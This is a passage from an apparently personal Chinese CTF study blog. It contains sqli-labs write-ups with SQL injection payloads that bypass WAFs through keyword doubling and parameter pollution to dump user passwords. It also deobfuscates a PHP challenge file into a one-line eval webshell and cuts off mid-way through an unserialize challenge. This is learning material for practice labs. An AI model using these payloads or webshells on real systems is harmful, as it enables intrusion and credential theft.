<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="hljs-string">&#x27;;%00</span><br><span class="hljs-string">?id=0&#x27;</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>Auunion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselectnion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselect<span class="hljs-operator">%</span><span class="hljs-number">0</span>A1,database(),group_concat(column_name)<span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Ainformation_schema.columns<span class="hljs-operator">%</span><span class="hljs-number">0</span>Awhere<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Aand<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(id,username,password)from%0Asecurity.users;%00</span><br></code></pre></td></tr></table></figure>
<h1 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h1><p>çœ‹ä¸€çœ¼æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);				//strip out /*</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);				//Strip out --.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);					//Strip out #.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);	    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>
<p>å¥½åƒåªå¯¹union select è¿›è¡Œäº†è¿‡æ»¤</p>
<p>payload</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">0</span>&#x27;)ununion selection <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>æ¯”ä¸Šå…³æ›´ç®€å•ï¼Œåªè¿‡äº†union selectï¼Œå…¶å®ƒéƒ½æ²¡è¿‡æ»¤  </p>
<h1 id="less29-wafè¿‡æ»¤"><a href="#less29-wafè¿‡æ»¤" class="headerlink" title="less29 wafè¿‡æ»¤"></a>less29 wafè¿‡æ»¤</h1><blockquote>
<p>ä»29åˆ°31å…³ï¼Œè¦ç”¨åˆ°å¯åŠ¨tomcatä½œä¸ºè¿‡æ»¤æœåŠ¡å™¨ï¼Œç¡®å®šå‚æ•°å®‰å…¨åæ‰äº¤ç»™apacheæœåŠ¡å™¨ã€‚åªéœ€å°†sqli-labsæ–‡ä»¶å¤¹ä¸‹çš„tomcat-files.zipè§£å‹åˆ°tomcat&#x2F;webapp&#x2F;ROOTç›®å½•ä¸‹ï¼Œå¯åŠ¨tomcat&#x2F;binä¸‹çš„startup.batå³å¯(å…³é—­ä¸ºshutdown.bat)ã€‚<br>by<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kukudeshuo/article/details/114763700">https://blog.csdn.net/kukudeshuo/article/details/114763700</a></p>
</blockquote>
<p>æˆ‘æ²¡æœ‰è·Ÿåšå®¢å»é…ç½®tomcatï¼Œä½†æ˜¯ç›´æ¥ç”¨login.phpæ¥è¿›è¡Œæµ‹è¯•<br>å¥½åƒå°±æ˜¯åŒæ ·æ•ˆæœï¼Œé‚£æˆ‘ç›´æ¥å½“å®ƒé…ç½®å¥½äº†å§  </p>
<p>é‚£å°±æ˜¯è¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/sqli-labs/Less-29/login.php?id=1   //å›æ˜¾æ­£å¸¸<br>/sqli-labs/Less-29/login.php?id=1&#x27;  //ä¼šè½¬åˆ°hacked.php<br></code></pre></td></tr></table></figure>
<p>é‚£å¤§æ¦‚å°±æ˜¯wafæˆåŠŸé˜»æ­¢äº†æ­¤æ¬¡æ³¨å…¥<br>é‚£å°±è¦æƒ³åŠæ³•ç»•è¿‡wafäº†  </p>
<blockquote>
<p>ç”±äºtomcatå’Œapacheè§£æå‚æ•°çš„é¡ºåºä¸åŒï¼Œå½“æ³¨å…¥ä¸¤ä¸ªå‚æ•°?id&#x3D;1&amp;id&#x3D;2ï¼Œæ­¤æ—¶tomcatè§£æçš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œapacheè§£æçš„æ˜¯ç¬¬äºŒä¸ªå‚æ•°å¹¶ä¸”SQLè¯­å¥ä¹Ÿæ˜¯åœ¨apacheæœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„ï¼Œç”±æ­¤ç»•è¿‡tomcatçš„æ£€æµ‹ã€‚<br>by<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p>
</blockquote>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-29</span><span class="hljs-operator">/</span>login.php<span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>&#x27;<span class="hljs-operator">--+</span><br><span class="hljs-comment">//å›æ˜¾</span><br><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>çš„å†…å®¹<br></code></pre></td></tr></table></figure>
<p>ç›´æ¥æ„é€ </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/sqli-labs/Less<span class="hljs-number">-29</span>/login.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-built_in">id</span>,username,password)<span class="hljs-keyword">from</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>æˆåŠŸ</p>
<h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>Webåº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼ˆWeb Application Firewallï¼ŒWAFï¼‰æ˜¯ä¸€ç§ç”¨äºä¿æŠ¤Webåº”ç”¨ç¨‹åºçš„å®‰å…¨è®¾å¤‡ã€‚Webåº”ç”¨ç¨‹åºæ˜¯æŒ‡é€šè¿‡Webæµè§ˆå™¨æˆ–å…¶ä»–Webå®¢æˆ·ç«¯è®¿é—®çš„åº”ç”¨ç¨‹åºã€‚WAFçš„ç›®çš„æ˜¯ä¿æŠ¤Webåº”ç”¨ç¨‹åºå…å—é»‘å®¢ã€ç½‘ç»œæ”»å‡»å’Œæ•°æ®æ³„æ¼ç­‰å®‰å…¨å¨èƒçš„æ”»å‡»ã€‚</p>
<h1 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h1><p>å’Œä¸Šä¸€å…³ä¸€æ ·æœ‰wafï¼Œä½†å¥½åƒæ²¡æœ‰idçš„è¯å°±ä¸ä¼šæœ‰å›æ˜¾</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-30</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">3</span>&amp;id=<span class="hljs-number">0</span>&quot;union select 1,2,3--+<br><br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>çœ‹äº†æºç è¿˜å·®ç‚¹æ‰¾ä¸åˆ°æ³¨å…¥ç‚¹ğŸ˜¥â€¦.</p>
<h1 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h1><p>waf<br>é—­åˆç‚¹</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-31</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span>&quot;) union select 1,2,3--+<br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;)<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<h1 id="ç»“æŸ"><a href="#ç»“æŸ" class="headerlink" title="ç»“æŸ"></a>ç»“æŸ</h1><p>æŒ‰åŸè®¡åˆ’ï¼Œsql-labsçš„å­¦ä¹ å°±å…ˆåˆ°è¿™ï¼Œä¸‹é¢sqlæ³¨å…¥çš„å­¦ä¹ è¯¥å»åšctfçœŸé¢˜äº†ï¼Œä¸å¾—ä¸è¯´sqli-labsçš„å¸®åŠ©çœŸæŒºå¤§ï¼Œèƒ½æ‰“å¥½sqlæ³¨å…¥çš„åŸç†å’ŒåŸºç¡€</p>
<hr>
<h2 id="title-note-15date-2025-03-20-19-43-49tags-review"><a href="#title-note-15date-2025-03-20-19-43-49tags-review" class="headerlink" title="title: note-15date: 2025-03-20 19:43:49tags: review"></a>title: note-15<br>date: 2025-03-20 19:43:49<br>tags: review</h2><h1 id="2024ä¸‹åŠå¹´é•¿åŸæ¯å›é¡¾"><a href="#2024ä¸‹åŠå¹´é•¿åŸæ¯å›é¡¾" class="headerlink" title="2024ä¸‹åŠå¹´é•¿åŸæ¯å›é¡¾"></a>2024ä¸‹åŠå¹´é•¿åŸæ¯å›é¡¾</h1><p>åœ¨æœºæˆ¿ä¸Šä»æ–°å›é¡¾3ä¸ªæœˆå‰çš„é•¿åŸæ¯webé¢˜wpï¼Œå‘ç°å·²ç»èƒ½çœ‹æ‡‚ä¸å°‘äº†  </p>
<h2 id="è¿½å¿†1-hello-web"><a href="#è¿½å¿†1-hello-web" class="headerlink" title="è¿½å¿†1 hello_web"></a>è¿½å¿†1 hello_web</h2><p>è¿˜è®°å¾—å½“åˆåšè¿™é¢˜å°±æ˜¯åœ¨é‚£å¹²çªçœ¼ï¼Œç”¨dirsearchå’ŒæŸ¥çœ‹å‰ç«¯è®¤å‡ºäº†ä¸ªhackme.phpã€‚<br>å·²ç»æ²¡æœ‰é¢˜ç›®ç¯å¢ƒäº†ï¼Œå¹²çœ‹å¤§ä½¬çš„wp<br><a target="_blank" rel="noopener" href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p>
<p>é‚£å¤§æ¦‚å°±æ˜¯åŒå†™..&#x2F;è¿›è¡Œç»•è¿‡æ¥ç›®å½•ç©¿è¶Šè®¿é—®åˆ°tipså’Œhackme<br><strong>(ä¸»è¦æ˜¯è¦å­¦ä¸€ä¸‹é¢å¯¹æœªçŸ¥ç¯å¢ƒæ—¶è¯¥æ€ä¹ˆåŠï¼Œç°åœ¨è¿˜æ²¡æœ‰ä¸€å¥—æ¸—é€æµç¨‹ï¼Œèµ·æ‰‹fuzzéƒ½fuzzä¸æ˜ç™½)</strong>   </p>
<p>ç„¶åèƒ½åœ¨tipsçœ‹åˆ°phpinfoå’Œè¿‡æ»¤å†…å®¹<br>ç„¶åæ˜¯hackme.php  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$YwzIst</span>(<span class="hljs-string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>çœ‹åˆ°å¤§ä½¬ä»¬è¯´ç»™åæ··æ·†ä¸€ä¸‹å°±è¡Œäº†ï¼Œæˆ‘æäº†ä¸¤èŠ‚è¯¾å¤§çº¦ä¸€ä¸ªåŠå°æ—¶æ‰ææ˜ç™½ğŸ˜«â€¦..<br>æ­¥éª¤å°±æ˜¯å…ˆæŒ‰phpçš„åˆ†å·ç»™åˆ†æ˜ç™½ä»£ç è¡Œï¼Œç„¶åå°è¯•ç”¨å¨å­è§£ç é‡Œé¢çœ‹ä¸æ‡‚çš„ä¸œè¥¿</p>
<p>è¿™æ˜¯æˆ‘æçš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<br><span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<br><span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-comment">//eval($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));</span><br><span class="hljs-variable">$uWcdaA</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox==&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br></code></pre></td></tr></table></figure>
<p>å…¶ä¸­ä¸€äº›å˜é‡æ‰”å¨å­ä¹Ÿç…®ä¸å‡ºæ¥ï¼Œçœ‹ä½¬ä»¬wpä¹Ÿæ˜¯ä¸åŠ¨å®ƒä»¬ï¼Œ<br>é‡è¦æ˜¯ä¸çŸ¥é“è¦echoçš„ä¸œè¥¿å¤§ä½¬ä»¬æ˜¯æ€ä¹ˆçŸ¥é“çš„ï¼Œåˆå»æ‰¾ä¸€å¤§å †wpï¼Œå¥½åƒéƒ½æ˜¯é»˜è®¤çŸ¥é“è¦echoå•¥ä¸€æ ·ï¼Œæœ€åè‡ªå·±ä»”ç»†çœ‹äº†ä¸€éå‘ç°å°±æ˜¯æŠŠbaseè§£ç å‡ºæ¥çš„evalé‡Œçš„å†…å®¹echoå‡ºæ¥ğŸ˜«ã€‚ã€‚ã€‚   </p>
<p><strong>å³ä½¿è ¢å¦‚çŒªè±šæˆ‘ä¹Ÿè¦åœ¨ctfèµ°ä¸‹å»å£ç‰™ï¼æˆ‘å°±æ˜¯è¿™æ ·çš„å“ˆåŸºå°¸å•Š</strong>  </p>
<p>æœ€åè¿è¡Œç»“æœå¥½åƒè¾“å‡ºä¸€å¤§ä¸²cssè¿˜æ˜¯htmlçš„ä¸œè¥¿ï¼Œä½†æ˜¯æœ€åæœ‰ä¸€å¥è¯æœ¨é©¬ï¼Œgetåˆ°å¯†ç äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/code&gt;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd_66.99&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æœ€åæ˜¯è¿æœ¨é©¬ï¼Œä½†æ˜¯æ³¨æ„è¦ç”¨èšå‰‘çš„UserFilteræ’ä»¶ï¼Œè¿™ä¸ªæ˜¯é’ˆå¯¹php7ç‰ˆæœ¬çš„ç»•è¿‡æ’ä»¶<br><a target="_blank" rel="noopener" href="https://hcnote.cn/2024/12/25/12056.html">https://hcnote.cn/2024/12/25/12056.html</a><br>ä¹Ÿå¯ä»¥ç”¨å…¶å®ƒæ’ä»¶æ¥ç»•è¿‡disable_fuction<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DumpInfou/p/18023278">https://www.cnblogs.com/DumpInfou/p/18023278</a><br><a target="_blank" rel="noopener" href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p>
<p>linuxä¸‹æœç´¢flagå­—ç¬¦</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span> -<span class="hljs-built_in">type</span> f <span class="hljs-number">2</span>&gt;/dev/null<br><br>grep -rvh â€˜<span class="hljs-built_in">flag</span>â€™<br></code></pre></td></tr></table></figure>



<hr>
<h2 id="title-note-16date-2025-03-22-22-39-23tags-unserialize"><a href="#title-note-16date-2025-03-22-22-39-23tags-unserialize" class="headerlink" title="title: note-16date: 2025-03-22 22:39:23tags: unserialize"></a>title: note-16<br>date: 2025-03-22 22:39:23<br>tags: unserialize</h2><h1 id="CISCN-2023-ååŒ—-ez-date"><a href="#CISCN-2023-ååŒ—-ez-date" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date"></a>[CISCN 2023 ååŒ—]ez_date</h1><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> 